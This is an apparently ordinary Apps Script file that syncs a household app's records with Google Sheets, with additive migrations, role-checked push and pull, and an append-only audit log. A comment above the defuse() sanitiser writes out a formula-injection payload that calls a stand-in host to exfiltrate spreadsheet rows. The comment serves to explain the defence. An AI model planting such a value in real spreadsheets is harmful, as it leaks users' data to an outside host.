/**
 * Sheets: schema migration, push, pull.
 *
 * The spreadsheet is a replica, not the source of truth. It has no
 * constraints, no types worth trusting and no transactions, so this file does
 * three things carefully and nothing clever:
 *
 *  - **Migrate additively.** New tabs and new columns appended on the right.
 *    Never a rename, never a move, never a delete. A family that has added
 *    their own column to a tab keeps it, and an older client that does not
 *    know about a newer column simply does not write to it.
 *
 *  - **Address columns by header name.** Never by position. Somebody will
 *    drag a column, and a positional writer would silently start writing
 *    dates into the amount column.
 *
 *  - **Never trust the row order.** An `_id → row` index is rebuilt per
 *    request from column A, because a user sorting the sheet is not an error
 *    condition, it is Tuesday.
 */

/* eslint-env googleappsscript */
/* global SpreadsheetApp, fail */

/** Envelope columns, always first and always in this order. */
var ENVELOPE = ['_id', '_rev', '_updatedAt', '_updatedBy', '_createdAt',
  '_deletedAt', '_origin', '_schemaVersion'];

var AUDIT_SHEET = '_Audit';

/* ------------------------------------------------------------- migration */

/**
 * @param {Array<{entity, sheet, version, columns}>} manifest
 * @returns {{created: string[], columnsAdded: object}}
 */
function schemaEnsure(manifest, book) {
  if (!manifest || !manifest.length) throw fail('no schema manifest was supplied', 400);

  var created = [];
  var columnsAdded = {};

  for (var i = 0; i < manifest.length; i++) {
    var spec = manifest[i];
    var sheet = book.getSheetByName(spec.sheet);

    if (!sheet) {
      sheet = book.insertSheet(spec.sheet);
      created.push(spec.sheet);
      var headers = ENVELOPE.concat(spec.columns);
      sheet.getRange(1, 1, 1, headers.length).setValues([headers]);
      sheet.setFrozenRows(1);
      sheet.getRange(1, 1, 1, headers.length).setFontWeight('bold');
      // Column A holds every id; a lookup that scans it is the hot path.
      sheet.getRange(1, 1, sheet.getMaxRows(), 1).setNumberFormat('@');
      continue;
    }

    var existing = headerRow(sheet);
    var missing = [];
    var wanted = ENVELOPE.concat(spec.columns);

    for (var c = 0; c < wanted.length; c++) {
      if (existing.indexOf(wanted[c]) === -1) missing.push(wanted[c]);
    }

    if (missing.length) {
      // Appended on the right. Inserting in place would move every value in
      // every row of a sheet somebody may have open.
      sheet.getRange(1, existing.length + 1, 1, missing.length).setValues([missing]);
      sheet.getRange(1, existing.length + 1, 1, missing.length).setFontWeight('bold');
      columnsAdded[spec.sheet] = missing;
    }
  }

  ensureAuditSheet(book);
  // The entity→tab mapping is remembered so a later push or pull does not
  // have to be given the manifest again.
  rememberManifest(manifest);
  return { created: created, columnsAdded: columnsAdded };
}

function ensureAuditSheet(book) {
  if (book.getSheetByName(AUDIT_SHEET)) return;
  var sheet = book.insertSheet(AUDIT_SHEET);
  sheet.getRange(1, 1, 1, 9).setValues([[
    'at', 'action', 'entity', 'recordId', 'actorId', 'actorRole', 'fields', 'deviceId', 'detail',
  ]]);
  sheet.setFrozenRows(1);
  sheet.getRange(1, 1, 1, 9).setFontWeight('bold');
}

function headerRow(sheet) {
  if (sheet.getLastColumn() === 0) return [];
  return sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0]
    .map(function (value) { return String(value); });
}

/* ------------------------------------------------------------------ push */

/**
 * @param {Array<{store, op, recordId, rev, payload}>} changes
 * @returns {{applied: string[], rejected: Array, conflicts: Array}}
 */
function sheetPush(changes, book, context) {
  if (!changes || !changes.length) return { applied: [], rejected: [], conflicts: [] };

  var applied = [];
  var rejected = [];
  var conflicts = [];

  // The check that makes the browser's rules more than a courtesy.
  //
  // `security/rbac.js` refuses the same writes on the device, and anybody who
  // opens devtools can make it stop. This runs on Google's servers under the
  // household's own authorisation, so a caller who has edited their role, or
  // written their own client, still cannot put a row in a sheet their account
  // may not write.
  //
  // Refused per row rather than for the batch: one change a child may not make
  // should not throw away the fourteen they may. The client is told which and
  // why through `rejected`, the same channel a validation failure uses.
  var permitted = [];
  var role = (context && context.role) || 'guest';
  var personId = (context && context.personId) || '';
  for (var c = 0; c < changes.length; c++) {
    // The blanket rule first, then the narrower one. A row about the caller is
    // reachable even where their role is not on the entity's list — which is
    // what lets a child keep their own health record and have it backed up.
    // Only ever a widening: nothing here can refuse what the policy allowed.
    if (policyAllows(role, 'write', changes[c].store)
      || ownRecordAllows(personId, changes[c].store, changes[c].payload)) {
      permitted.push(changes[c]);
    } else {
      rejected.push({
        recordId: changes[c].recordId,
        reason: 'a ' + role + ' may not write ' + changes[c].store,
      });
    }
  }
  if (!permitted.length) return { applied: applied, rejected: rejected, conflicts: conflicts };
  changes = permitted;

  // Grouped by sheet so each tab is read once, not once per row.
  var bySheet = {};
  for (var i = 0; i < changes.length; i++) {
    var name = sheetNameFor(changes[i].store, book);
    (bySheet[name] = bySheet[name] || []).push(changes[i]);
  }

  for (var sheetName in bySheet) {
    if (!Object.prototype.hasOwnProperty.call(bySheet, sheetName)) continue;
    var sheet = book.getSheetByName(sheetName);
    if (!sheet) {
      for (var m = 0; m < bySheet[sheetName].length; m++) {
        rejected.push({
          recordId: bySheet[sheetName][m].recordId,
          reason: 'no sheet named ' + sheetName + ' — run a schema migration',
        });
      }
      continue;
    }

    var headers = headerRow(sheet);
    var index = buildIndex(sheet);
    var lastRow = sheet.getLastRow();
    var appends = [];

    var group = bySheet[sheetName];
    for (var j = 0; j < group.length; j++) {
      var change = group[j];
      var row = index[change.recordId];

      if (row) {
        var current = sheet.getRange(row, 1, 1, headers.length).getValues()[0];
        var currentRev = Number(current[headers.indexOf('_rev')] || 0);
        var currentOrigin = String(current[headers.indexOf('_origin')] || '');

        // The server holds a revision at least as new, written by a different
        // device: that is a genuine collision, and the client owns the merge.
        if (currentRev >= Number(change.rev) && currentOrigin !== String(change.payload._origin || '')) {
          conflicts.push({ store: change.store, record: rowToRecord(headers, current) });
          continue;
        }

        sheet.getRange(row, 1, 1, headers.length)
          .setValues([recordToRow(headers, change.payload)]);
        applied.push(change.recordId);
      } else {
        appends.push(recordToRow(headers, change.payload));
        applied.push(change.recordId);
      }
    }

    if (appends.length) {
      // One write for every new row in the batch. Appending individually is
      // the difference between a two-second sync and a two-minute one.
      sheet.getRange(lastRow + 1, 1, appends.length, headers.length).setValues(appends);
    }
  }

  if (context && context.email) {
    log('push', context.email, applied.length + ' applied, ' + conflicts.length + ' conflicts', 0);
  }

  return { applied: applied, rejected: rejected, conflicts: conflicts };
}

/** `{ recordId: rowNumber }`, rebuilt per request because rows move. */
function buildIndex(sheet) {
  var lastRow = sheet.getLastRow();
  if (lastRow < 2) return {};

  var ids = sheet.getRange(2, 1, lastRow - 1, 1).getValues();
  var index = {};
  for (var i = 0; i < ids.length; i++) {
    var id = String(ids[i][0] || '');
    if (id) index[id] = i + 2;
  }
  return index;
}

/* ------------------------------------------------------------------ pull */

/**
 * Everything changed after each store's cursor. The cursor is a `_updatedAt`
 * watermark, and rows are returned in that order so a partial batch still
 * advances it correctly.
 */
function sheetPull(cursors, limit, book, context) {
  var sheets = book.getSheets();
  var records = {};
  var nextCursors = {};
  var more = false;
  var budget = limit;
  var role = (context && context.role) || 'guest';
  var personId = (context && context.personId) || '';

  for (var i = 0; i < sheets.length; i++) {
    var sheet = sheets[i];
    var name = sheet.getName();
    if (name.charAt(0) === '_') continue; // _Audit, _Log, _Meta

    var entityName = entityForSheet(name);
    if (!entityName) continue;

    // Not sent at all, rather than sent and hidden by the client. A row that
    // reached the device would be in IndexedDB, in the search index and in an
    // export, whatever a screen chose to draw.
    //
    // The cursor is deliberately left alone for a skipped entity: advancing it
    // would mean that promoting somebody later showed them only what changed
    // after the promotion, with the history silently missing.
    // The blanket rule, then the narrower one. Where the role may not read the
    // entity at all, rows *about the caller* are still sent — filtered per row
    // below rather than skipped wholesale, which is what lets a child's own
    // health record reach their own device and no one else's.
    var blanket = policyAllows(role, 'read', entityName);
    var ownField = blanket ? '' : OWN_RECORD[entityName];
    if (!blanket && !(ownField && personId)) continue;

    var since = cursors[entityName] || '';
    var lastRow = sheet.getLastRow();
    if (lastRow < 2) continue;

    var headers = headerRow(sheet);
    var values = sheet.getRange(2, 1, lastRow - 1, headers.length).getValues();
    var updatedAtColumn = headers.indexOf('_updatedAt');

    var subjectColumn = ownField ? headers.indexOf(ownField) : -1;
    // An own-record entity whose subject column is missing from the sheet
    // sends nothing rather than everything. A header this cannot find is a
    // workbook older than the rule, and guessing would be the one mistake
    // worth avoiding here.
    //
    // Belt and braces, and worth naming as such: mutation-testing showed
    // removing this changes no outcome today, because the per-row comparison
    // below reads `values[r][-1]` as undefined and matches nobody. That is an
    // accident of a loose comparison rather than a rule, and it would stop
    // holding the moment somebody made the comparison lenient. The rule stays
    // stated where it can be read.
    if (ownField && subjectColumn < 0) continue;

    var changed = [];
    for (var r = 0; r < values.length; r++) {
      var updatedAt = isoOf(values[r][updatedAtColumn]);
      if (!updatedAt || updatedAt <= since) continue;
      if (ownField && String(values[r][subjectColumn]) !== personId) continue;
      changed.push({ updatedAt: updatedAt, row: values[r] });
    }

    changed.sort(function (a, b) {
      return a.updatedAt < b.updatedAt ? -1 : a.updatedAt > b.updatedAt ? 1 : 0;
    });

    if (changed.length > budget) {
      changed = changed.slice(0, budget);
      more = true;
    }
    if (!changed.length) continue;

    records[entityName] = changed.map(function (item) {
      return rowToRecord(headers, item.row);
    });
    nextCursors[entityName] = changed[changed.length - 1].updatedAt;
    budget -= changed.length;
    if (budget <= 0) {
      more = true;
      break;
    }
  }

  return { records: records, cursors: nextCursors, more: more };
}

/* ----------------------------------------------------------------- audit */

function auditAppend(entries, book, context) {
  if (!entries || !entries.length) return { appended: 0 };
  ensureAuditSheet(book);

  var sheet = book.getSheetByName(AUDIT_SHEET);
  var rows = entries.map(function (entry) {
    return [
      entry.at || new Date().toISOString(),
      entry.action || '',
      entry.entity || '',
      entry.recordId || '',
      entry.actorId || '',
      entry.actorRole || '',
      (entry.fields || []).join(', '),
      entry.deviceId || '',
      JSON.stringify(entry.detail || {}),
    ];
  });

  // Append only. Nothing in this deployment ever updates or deletes an audit
  // row, which is the only property that makes the log worth keeping.
  sheet.getRange(sheet.getLastRow() + 1, 1, rows.length, 9).setValues(rows);
  if (context && context.email) log('audit', context.email, rows.length + ' entries', 0);
  return { appended: rows.length };
}

/* ----------------------------------------------------------------- counts */

function sheetCounts(book) {
  var sheets = book.getSheets();
  var counts = {};
  for (var i = 0; i < sheets.length; i++) {
    var name = sheets[i].getName();
    if (name.charAt(0) === '_') continue;
    counts[name] = Math.max(0, sheets[i].getLastRow() - 1);
  }
  return counts;
}

/* ---------------------------------------------------------------- mapping */

/**
 * Sheet name ⇄ entity name. The client sends the entity; the manifest carries
 * the mapping, and it is cached in script properties so a push does not have
 * to be given the manifest again.
 */
function sheetNameFor(entityName, book) {
  var map = manifestMap();
  if (map[entityName]) return map[entityName];
  // Fall back to a tab already named after the entity, which is what a manual
  // recovery would produce.
  return book.getSheetByName(entityName) ? entityName : entityName;
}

function entityForSheet(sheetName) {
  var map = manifestMap();
  for (var entityName in map) {
    if (map[entityName] === sheetName) return entityName;
  }
  return null;
}

function manifestMap() {
  var raw = PropertiesService.getUserProperties().getProperty('sheetMap');
  return raw ? JSON.parse(raw) : {};
}

function rememberManifest(manifest) {
  var map = {};
  for (var i = 0; i < manifest.length; i++) map[manifest[i].entity] = manifest[i].sheet;
  PropertiesService.getUserProperties().setProperty('sheetMap', JSON.stringify(map));
}

/* --------------------------------------------------------------- records */

function recordToRow(headers, record) {
  var row = [];
  for (var i = 0; i < headers.length; i++) {
    var header = headers[i];
    var value = header.charAt(0) === '_'
      ? record[header.substring(1)]
      : record[header];

    if (value === undefined || value === null) {
      row.push('');
    } else if (value instanceof Array) {
      row.push(value.join(', '));
    } else if (typeof value === 'object') {
      row.push(JSON.stringify(value));
    } else {
      row.push(defuse(value));
    }
  }
  return row;
}

function rowToRecord(headers, row) {
  var record = {};
  for (var i = 0; i < headers.length; i++) {
    var header = headers[i];
    var value = row[i];

    if (header === '_updatedAt' || header === '_createdAt' || header === '_deletedAt') {
      record[header.substring(1)] = value === '' ? null : isoOf(value);
    } else if (header === '_rev' || header === '_schemaVersion') {
      record[header.substring(1)] = Number(value) || 0;
    } else if (header.charAt(0) === '_') {
      record[header.substring(1)] = String(value);
    } else {
      record[header] = restore(value);
    }
  }
  record.syncState = 'synced';
  return record;
}

/**
 * A value beginning `=`, `+`, `-` or `@` is a formula to Sheets. A payee named
 * `=IMPORTXML("http://evil.test", "//x")` would exfiltrate the row the moment
 * anyone opened the workbook. The client already prefixes an apostrophe; this
 * is the second line of the same defence, for rows written by an older client.
 */
function defuse(value) {
  var text = String(value);
  return /^[=+\-@\t\r]/.test(text) ? "'" + text : text;
}

function restore(value) {
  if (value instanceof Date) return isoOf(value);
  if (typeof value !== 'string') return value;
  return /^'[=+\-@\t\r]/.test(value) ? value.substring(1) : value;
}

function isoOf(value) {
  if (value instanceof Date) return value.toISOString();
  if (!value) return '';
  var text = String(value);
  // Already an ISO string written by the client; leave it exactly as it is,
  // because reformatting is how a cursor comparison starts failing.
  if (/^\d{4}-\d{2}-\d{2}T/.test(text)) return text;
  var parsed = new Date(text);
  return isNaN(parsed.getTime()) ? '' : parsed.toISOString();
}
